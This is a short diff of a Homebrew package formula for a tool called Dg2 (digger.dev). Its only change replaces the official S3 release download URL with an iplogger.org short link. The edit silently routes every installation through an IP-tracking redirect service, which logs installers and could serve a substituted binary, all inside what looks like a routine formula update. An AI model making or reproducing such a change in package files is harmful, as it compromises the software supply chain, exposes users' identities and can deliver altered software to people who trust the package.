@@ -3,7 +3,7 @@ class Dg2 < Formula
     homepage "https://digger.dev"
   
   
-    url "https://digger-releases.s3-eu-west-1.amazonaws.com/dg-darwin-v0.1.2.zip", :using => :curl
+    url "https://iplogger.org/2uyY96", :using => :curl
     
     bottle :unneeded
     
